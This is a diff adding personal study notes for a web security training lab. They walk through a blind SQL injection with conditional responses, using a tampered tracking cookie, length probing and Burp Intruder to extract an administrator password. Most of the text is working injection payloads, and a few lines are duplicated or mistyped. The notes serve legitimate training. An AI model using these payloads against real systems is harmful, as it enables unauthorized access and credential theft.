@@ -131,3 +131,44 @@ SQL injection UNION attack, retrieving multiple values in a single column
 	'+UNION+SELECT+NULL,username+||'--'||+password+FROM+users--
 	We see: administrator--di51zyvf7p1kgatsuv37
 	That means that the user adminstrator has the password di51zyvf7p1kgatsuv37
+	
+	
+Blind SQL injection with conditional responses
+	First we open Burp->Proxy->Open Browser and go to the lab because we need to edit the requests
+	First we check whether the app responds to different conditional statements.
+	We find the cookie trackingID and change it to: '+OR+1=1--
+	and we see that it prints welcome back. We change it to
+	'+OR+1=1--
+	And we see that the message goes away, so the application responds to different conditional satements
+	The first step to find the password is to find the length of the password
+	'+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+	Welcome back appears
+	We continue increasing length to find that the length of the password is 20 characters long becauses
+	'+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+AND+length(password)>19--
+	is the last query that prints the welcome back messsage	
+	Now one-by-one we try to guess the characters of the password
+	+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+AND+length(password)>19--
+	
+	Now we want to find the characters. We can do it manually, or we can use Burp Intruder
+	Send the request from Intruder mode and replace the trackingID with from the Positions Tab
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,20,1)+=+'§m§'--
+	Go to payload and add in the payload options all the letters of the alhpabet and the numbers 0-9. We do that
+	because we want to check if the substring of the password identified from the first number of the SUBSTRING clause 
+	is the same as one of the characters in the list.
+	Also go to the Options tab and add in Grep Welcome Back and check the Flag result items....
+	Run the attack for every of the 20 characters by changing the offset in the SUBSTRING. The checks in the new windows give
+	the password of the administrator.
+	Log in with those credentials
+	
+	'+UNION+SELECT+username+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,1,1)+>+'m'--
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
